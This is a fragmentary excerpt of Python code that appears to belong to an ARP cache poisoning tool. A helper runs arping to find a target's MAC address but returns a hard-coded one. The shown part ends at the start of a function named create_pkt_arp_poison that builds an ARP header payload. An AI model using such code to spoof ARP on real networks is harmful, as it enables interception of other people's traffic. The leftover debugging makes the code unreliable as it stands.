...
def get_dst_mac_addr():
    p = subprocess.Popen(["arping", argv[2], "-c", "2"],
                         shell=False, stdout=subprocess.PIPE)
    sleep(2)
    remote_mac = search('(([0-9a-f]{2}:){5}[0-9a-f]{2})', p.communicate()[0])
    #remote_mac = search('(([0-9a-f]{2}:){5}[0-9a-f]{2})', "30:F9:ED:EE:91:1D")
    #return unhexlify(remote_mac.group(0).replace(':', ''))
    return unhexlify("0c:d2:92:b0:bd:4b".replace(':', ''))
...
def create_pkt_arp_poison():
    ...
    payload = "\x00\x01\x08\x00\x06\x04\x00\x01"
